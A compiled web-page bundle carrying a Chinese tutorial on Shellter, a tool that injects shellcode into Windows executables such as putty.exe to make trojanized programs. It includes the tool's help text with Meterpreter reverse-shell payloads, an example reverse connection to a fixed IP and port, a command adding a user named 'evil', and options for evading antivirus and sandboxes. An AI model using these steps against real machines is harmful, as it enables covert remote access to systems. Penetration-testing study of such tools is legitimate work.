(window.webpackJsonp=window.webpackJsonp||[]).push([[62],{412:function(e,t,n){"use strict";n.r(t);var a=n(1),s=Object(a.a)({},function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[n("p",[e._v("Shellter是一个动态的shellcode注入工具，也是有史以来第一个真正动态的PE感染器。 它可用于将shellcode注入本机Windows应用程序（目前仅限32位应用程序）。 shellcode可以是你自己payload，也可以是通过框架生成payload，比如Metasploit或CS。\n")]),e._v(" "),n("p",[e._v("shellter程序的"),n("a",{attrs:{href:"https://www.shellterproject.com/",target:"_blank",rel:"noopener noreferrer"}},[e._v("下载地址\b"),n("OutboundLink")],1),e._v("\b，命令行下直接执行shellter.exe")]),e._v(" "),n("div",{staticClass:"language-json extra-class"},[n("pre",{pre:!0,attrs:{class:"language-json"}},[n("code",[e._v("Choose Operation Mode - Auto/Manual (A/M/H)"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" A\nPerform Online Version Check? (Y/N/H)"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" N\nPE Target"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" D"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v("\\shellter\\shellcode_samples\\putty.exe\nEnable Stealth Mode? (Y/N/H)"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Y\nUse a listed payload or custom? (L/C/H)"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" C\n#如果使用CS，则生成payload.bin的脚本\n")])])]),n("h3",{attrs:{id:"kali操作说明："}},[n("a",{staticClass:"header-anchor",attrs:{href:"#kali操作说明：","aria-hidden":"true"}},[e._v("#")]),e._v(" kali操作说明：")]),e._v(" "),n("ol",[n("li",[e._v("在kali下安装shellter.exe 需要\b安装wine。")])]),e._v(" "),n("div",{staticClass:"language-json extra-class"},[n("pre",{pre:!0,attrs:{class:"language-json"}},[n("code",[e._v("root@kali"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v("~# dpkg --add-architecture i"),n("span",{pre:!0,attrs:{class:"token number"}},[e._v("386")]),e._v("\nroot@kali"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v("~# apt update && apt install wine"),n("span",{pre:!0,attrs:{class:"token number"}},[e._v("32")]),e._v("\nroot@kali"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v("~# shellter\n")])])]),n("ol",{attrs:{start:"2"}},[n("li",[e._v("kali环境命令。")])]),e._v(" "),n("div",{staticClass:"language-json extra-class"},[n("pre",{pre:!0,attrs:{class:"language-json"}},[n("code",[e._v("root@kali"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v("~# shellter.exe -h\n**********************\n* Command Line Usage *\n**********************\n\n\nHelp"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" -h"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" --help\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Shows the command line help menu.\n\nList Payloads"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" --list\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Shows a list of the embedded payloads.\n\nVerbose Mode"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" -v\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Shows Real-Time Tracing.\n\nOperation Mode"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" -a / -m\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Sets the Operation Mode to use.\n\n-a"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Auto Mode"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" -m"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Manual Mode. (See Remarks)\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Manual Mode requires user interaction for all options.\n\nOnline version check"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" --VersionCheck\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Retrieves version information from the official website.\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Requires internet connection. Not available in Wine mode.\n\nPE target"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" -f <filename>\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Sets the PE target.\n\nStealth Mode"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" -s / --stealth\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Enables Stealth Mode feature. Preserves original functionality of\n        the infected PE file.\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" If this feature is enabled then --enc"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" --encode"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" and --handler IAT\n      are implied as set.\n\nPayload"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" -p <filename>/<listed payload>\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Sets the payload. Must be in RAW format.\n\nMetasploit"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" generate -t raw.\n\n\nThe following payloads can be used directly through Shellter.\n\n************\n* Payloads *\n************\n\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[e._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("]")]),e._v(" Meterpreter_Reverse_TCP   "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("[")]),e._v("stager"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("]")]),e._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[e._v("2")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("]")]),e._v(" Meterpreter_Reverse_HTTP  "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("[")]),e._v("stager"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("]")]),e._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[e._v("3")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("]")]),e._v(" Meterpreter_Reverse_HTTPS "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("[")]),e._v("stager"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("]")]),e._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[e._v("4")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("]")]),e._v(" Meterpreter_Bind_TCP      "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("[")]),e._v("stager"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("]")]),e._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[e._v("5")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("]")]),e._v(" Shell_Reverse_TCP         "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("[")]),e._v("stager"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("]")]),e._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[e._v("6")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("]")]),e._v(" Shell_Bind_TCP            "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("[")]),e._v("stager"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("]")]),e._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[e._v("7")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("]")]),e._v(" WinExec\n\n\nExample"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" -p meterpreter_reverse_tcp --lhost "),n("span",{pre:!0,attrs:{class:"token number"}},[e._v("192.168")]),e._v("."),n("span",{pre:!0,attrs:{class:"token number"}},[e._v("30.133")]),e._v(" --port "),n("span",{pre:!0,attrs:{class:"token number"}},[e._v("4444")]),e._v("\n\nLHOST"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" --lhost <IP address>/<Domain Name>\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Sets the IP address or the Domain Name for the embedded payloads\n        that use reverse connection.\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Domain names can be used with the reverse_http and reverse_https\n      payloads"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" or with custom payloads generated by the user.\n\nPort"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" --port <Port number>\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Sets the port number for the embedded payloads that\n        either use reverse connection"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" or listen locally for\n        inbound connections.\n\nCMD"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" --cmd <cmd argument>\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Sets the command to execute argument for the embedded\n        windows command execution payload.\n\n\nExample"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" -p winexec --cmd "),n("span",{pre:!0,attrs:{class:"token string"}},[e._v('"cmd.exe /c net user evil password /ADD"')]),e._v("\n\nEnable DLL Reflective Loader support"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" --reflective <FuncName>\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Marks the payload as DLL and sets the reflective loader function.\n\nThis flag automatically enables encoded-payload support because the loader\nmight require RW permissions to itself. You will have to set the --handler\nargument as well.\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Function names are case sensitive.\n\nThreads tracing"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" --trace main / all\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Sets the threads to be traced.\n\nmain"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Main Thread"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" all"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" All Threads Tracing.\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" It is recommended to enable all threads tracing. This is enabled\n      by default when auto mode is used without command line arguments.\n\nEnable encoded-payload support"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" --enc\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Handles encoded payloads.\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" If you use an encoded payload"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" this flag is mandatory! However"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v("\n      it is enabled by default when auto mode is used without command\n      line arguments.\n      It is recommended to always use encoded payloads"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" unless they\n      are completely custom"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" thus not known to AVs.\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" You can choose to apply Shellter's encoder by using the --encode\n      arument. It can also be used on top of already encoded payloads.\n\nProprietary Shellter Encoding"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" --encode / --encode "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("{")]),e._v("<encoding sequence>"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("}")]),e._v("\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Applies an extra encoding layer.\n        It is enabled by default when using auto mode without command\n        line arguments.\n\n********************************\n* Supported Encoding Operators *\n********************************\n\nXOR --\x3e x\nADD --\x3e +\nSUB --\x3e -\nNOT --\x3e !\n\nExample #"),n("span",{pre:!0,attrs:{class:"token number"}},[e._v("1")]),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" x!+x\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" When the encoding sequence is defined from the command line"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" the\n      operators need to be enclosed between '"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("{")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("}")]),e._v("'.\n\n      Example #"),n("span",{pre:!0,attrs:{class:"token number"}},[e._v("2")]),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" --encode "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("{")]),e._v("x!+"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("}")]),e._v("\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" In Manual mode you must not include the '"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("{")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("}")]),e._v("' characters"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" just as in the\n      first example shown above.\n\nRemarks"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" The number of operators defined"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" must be between a minimum of "),n("span",{pre:!0,attrs:{class:"token number"}},[e._v("1")]),e._v(" and\n         a maximum of "),n("span",{pre:!0,attrs:{class:"token number"}},[e._v("12")]),e._v(" operators.\n         If you just use the --encode switch without defining a custom\n         sequence of encoding operations"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" Shellter will randomly create\n         and apply an encoding scheme by itself.\n         If you enable stealth mode using --stealh/-s switches"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" then the\n         --encode switch is implied"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" but if you want to use a custom one\n         then you need to explicitly use the --encode switch as shown\n         in Example #"),n("span",{pre:!0,attrs:{class:"token number"}},[e._v("2.")]),e._v("\n\n\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" You will have to set the --handler argument as well.\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" If you set --encode switch"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" then --enc is implied as set.\n\nEncode using Dynamic Thread Context Key"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" --DTCK\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Encodes the payload using dynamic thread context information.\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" This is an experimental feature that logs the content of some\n      CPU registers and then filters all that data in order to keep\n      injection locations where at least one of the logged registers\n      has a value that can be reliably used for encoding and later\n      for decoding the payload on runtime.\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" If you set this flag"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" then --encode and --enc are implied as set.\n      In Auto mode"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" this feature can only be activated by using command\n      line arguments.\n\nProprietary Decoder Obfuscation"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" --polyDecoder\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Obfuscates the decoder generated by Shellter using\n        Thread Context Aware Polymorphic code.\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" This only applies if --encode option has been set. It is\n      enabled by default when using auto mode without command\n      line arguments.\n\nEncoded Payload Handling Type"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" --handler iat / section\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Defines how the encoded payload will be handled.\n\niat"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Use IAT pointers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" section"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Give to section RWE permissions.\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" If you use an encoded payload"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" this flag is mandatory! However"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v("\n      when you use auto mode without command line arguments"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" this is\n      enabled by default.\n\nObfuscate IAT type handler"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" --polyIAT\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Enables obfuscation of IAT type handlers for encoded payloads\n        using Thread Context Aware Polymorphic code.\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Contributes towards a much more polymorphic output! It is enabled\n      by default when using auto mode without command line arguments.\n\nGenerate & Bind PolyMorphic Junk Code"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" --junk\n\nAction"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Enables PolyMorphic Junk Code.\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" It is recommended to enable this option in order to produce\n      a more complex output. This type of code added also serves\n      for timing-out some emulators and sandboxes. You might have\n      to wait for a few seconds before the payload gets executed.\n\nNote"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" This feature is enabled by default when using automode without\n      command line arguments.\n\n\nRemarks"),n("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v("\n\ni. When running inside Wine"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" the compatible Engine is selected automatically.\n\nii. If Manual Mode has been selected"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" all other options are ignored.\n\niii. If no Operation Mode (-a/-m) has been selected though command line"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v("\n     then Auto Mode applies.\n\niv. If '--enc' and/or '--encode' and/or --DTCK are set"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" then '--handler' must\n    be also set.\n\nv. Tracing of all threads is enabled by default when using the Auto Mode.\n   You can disable it by specifying '--trace main' -Not Recommended-.\n\nvi. If Stealth Mode is enabled (-s/--stealth)"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" the injected payload will\n    always be encoded by Shellter and --handler IAT is set by default.\n\nvii. Arguments can be passed in any order. If the same argument is used more\n     than once"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" then only the first occurence is taken in consideration.\n")])])]),n("h3",{attrs:{id:"参考资料："}},[n("a",{staticClass:"header-anchor",attrs:{href:"#参考资料：","aria-hidden":"true"}},[e._v("#")]),e._v(" 参考资料：")]),e._v(" "),n("ol",[n("li",[e._v("https://tools.kali.org/maintaining-access/shellter")])])])},[],!1,null,null,null);t.default=s.exports}}]);